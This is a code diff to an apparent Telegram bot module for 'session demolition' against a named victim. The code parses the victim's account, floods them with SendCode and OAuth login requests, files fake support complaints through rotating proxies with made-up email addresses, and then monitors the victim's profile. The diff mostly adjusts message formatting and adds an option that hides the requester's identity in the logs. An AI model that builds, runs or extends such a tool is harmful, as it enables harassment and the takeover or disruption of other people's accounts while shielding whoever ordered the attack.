@@ -25,7 +25,7 @@ from telethon.errors import FloodWaitError, PhoneNumberInvalidError
 
 import config
 from config import bot_logs
-from utils import now_msk
+from utils import now_msk, esc_md
 
 logger = logging.getLogger(__name__)
 
@@ -153,7 +153,7 @@ def _proxy_url(raw: str) -> str:
     parts = raw.split(":")
     if len(parts) == 4:
         host, port, user, pwd = parts
-        return f"socks5://{user}:{pwd}@{host}:{port}"
+        return f"socks5://{user}:{pwd}@{esc_md(host)}:{port}"
     elif len(parts) == 2:
         return f"socks5://{raw}"
     return raw
@@ -172,7 +172,7 @@ def _rand_email() -> str:
     names = ["ivan", "alex", "dmitry", "sergey", "mike", "andrey", "pavel"]
     domains = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "protonmail.com"]
     n = random.choice(names) + str(random.randint(10, 9999))
-    return f"{n}@{random.choice(domains)}"
+    return f"{n}@{esc_md(random.choice(domains))}"
 
 
 # ─── Шаг 1: парсинг жертвы ────────────────────────────────────────────────────
@@ -434,7 +434,7 @@ async def send_web_support(phone: str, username: str, victim_id: int,
                 f"Данные аккаунта:\n"
                 f"Номер телефона: {phone}\n"
                 f"ID аккаунта: {victim_id}\n"
-                f"Username: @{username}"
+                f"Username: *@{username}*"
             )
             subject = random.choice(SUPPORT_SUBJECTS)
             proxy_url = _proxy_url(random.choice(proxies)) if proxies else None
@@ -519,21 +519,29 @@ async def monitor_session_loop(username: str, victim_id: int,
 
             user_msg = (
                 f"🔔 *Мониторинг сессий — изменение*\n\n"
-                f"🎯 Цель: `@{username}` (`{victim_id}`)\n"
+                f"🎯 Цель: *@{username}* ({victim_id})\n"
                 f"{change_text}\n\n"
-                f"⏰ `{ts}`\n"
+                f"⏰ {ts}\n"
                 f"✅ *Вероятно сессии снесены!*"
             )
+            try:
+                import db as _db_mod
+                _is_hid = await _db_mod.get_is_hidden(user_id)
+                _log_uid = "скрыт" if _is_hid else str(user_id)
+                _log_uname = "скрыт" if _is_hid else requester_username
+            except Exception:
+                _log_uid, _log_uname = str(user_id), requester_username
+
             log_msg = (
                 f"🔔 *Session Monitor*\n"
-                f"🎯 `@{username}` | `{victim_id}`\n"
+                f"🎯 *@{username}* | {victim_id}\n"
                 f"{change_text}\n"
-                f"👤 {user_id} (@{requester_username})\n"
+                f"👤 {_log_uid} (*@{_log_uname}*)\n"
                 f"⏰ {ts}"
             )
 
             try:
-                await bot.send_message(user_id, user_msg, parse_mode="Markdown")
+                await _notify.send_message(user_id, user_msg, parse_mode="Markdown")
                 await main_bot.send_message(bot_logs, log_msg, parse_mode="Markdown")
             except Exception as e:
                 logger.error(f"[SESSION_MONITOR] Ошибка отправки: {e}")
@@ -544,7 +552,7 @@ async def monitor_session_loop(username: str, victim_id: int,
 # ─── Главная точка входа ──────────────────────────────────────────────────────
 
 async def main_session_snos(user_id: int, username: str,
-                             victim_username: str, victim_phone: str):
+                             victim_username: str, victim_phone: str, notify_bot=None):
     """
     Полный цикл сноса сессий.
     victim_username — username жертвы (без @)
@@ -557,20 +565,20 @@ async def main_session_snos(user_id: int, username: str,
 
     async def progress(text: str):
         try:
-            await bot.send_message(user_id, text, parse_mode="Markdown")
+            await _notify.send_message(user_id, text, parse_mode="Markdown")
         except Exception:
             pass
 
     # ── 1. Парсим жертву ──────────────────────────────────────────────────────
-    await bot.send_message(user_id,
+    await _notify.send_message(user_id,
         f"🔍 *Снос сессий* — старт\n"
-        f"*└─ Парсинг @{victim_username}...*",
+        f"*└─ Парсинг *@{victim_username}*...*",
         parse_mode="Markdown")
 
     victim = await _parse_victim(victim_username)
     if not victim["ok"]:
-        await bot.send_message(user_id,
-            f"❌ *Не удалось найти жертву:* `{victim.get('error', 'unknown')}`",
+        await _notify.send_message(user_id,
+            f"❌ *Не удалось найти жертву:* {victim.get('error', 'unknown')}",
             parse_mode="Markdown",
             reply_markup=keyboards.main_menu)
         return
@@ -578,9 +586,9 @@ async def main_session_snos(user_id: int, username: str,
     victim_id = victim["id"]
     baseline = {"has_photo": victim["has_photo"], "about": victim["about"]}
 
-    await bot.send_message(user_id,
+    await _notify.send_message(user_id,
         f"✅ *Жертва найдена*\n"
-        f"*└─ ID:* `{victim_id}`\n"
+        f"*└─ ID:* {victim_id}\n"
         f"*└─ Аватарка:* {'есть' if baseline['has_photo'] else 'нет'}\n"
         f"*└─ Описание:* {'есть' if baseline['about'] else 'нет'}\n\n"
         f"🚀 *Запускаю атаку...*",
@@ -599,27 +607,27 @@ async def main_session_snos(user_id: int, username: str,
     # ── 5. Итог ───────────────────────────────────────────────────────────────
     summary_user = (
         f"📊 *Снос сессий — итог*\n\n"
-        f"🎯 *Цель:* `@{victim_username}` (`{victim_id}`)\n"
-        f"📱 *Номер:* `{victim_phone}`\n\n"
-        f"📲 *SendCode флуд:* `{sc['sent']}/{sc['total']}` сессий\n"
-        f"🌐 *OAuth флуд:* `{oa['sent']}/{oa['total']}` запросов\n"
-        f"📨 *Web support:* `{ws['sent']}/{ws['total']}` жалоб\n\n"
+        f"🎯 *Цель:* *@{victim_username}* ({victim_id})\n"
+        f"📱 *Номер:* {victim_phone}\n\n"
+        f"📲 *SendCode флуд:* {sc['sent']}/{sc['total']} сессий\n"
+        f"🌐 *OAuth флуд:* {oa['sent']}/{oa['total']} запросов\n"
+        f"📨 *Web support:* {ws['sent']}/{ws['total']} жалоб\n\n"
         f"🔍 *Мониторинг запущен* — каждые 10 мин\n"
         f"*└─ Уведомлю при изменении аватарки/описания*\n\n"
-        f"⏰ `{ts}`"
+        f"⏰ {ts}"
     )
     summary_log = (
         f"💀 *Session Snos*\n"
-        f"🎯 `@{victim_username}` | `{victim_id}`\n"
-        f"📱 `{victim_phone}`\n"
-        f"📲 SC: `{sc['sent']}/{sc['total']}` | "
-        f"🌐 OAuth: `{oa['sent']}/{oa['total']}` | "
-        f"📨 Web: `{ws['sent']}/{ws['total']}`\n"
-        f"👤 {user_id} (@{username})\n"
+        f"🎯 *@{victim_username}* | {victim_id}\n"
+        f"📱 {victim_phone}\n"
+        f"📲 SC: {sc['sent']}/{sc['total']} | "
+        f"🌐 OAuth: {oa['sent']}/{oa['total']} | "
+        f"📨 Web: {ws['sent']}/{ws['total']}\n"
+        f"👤 {user_id} (*@{username}*)\n"
         f"⏰ {ts}"
     )
 
-    await bot.send_message(user_id, summary_user,
+    await _notify.send_message(user_id, summary_user,
         parse_mode="Markdown", reply_markup=keyboards.main_menu)
     await main_bot.send_message(bot_logs, summary_log, parse_mode="Markdown")
 
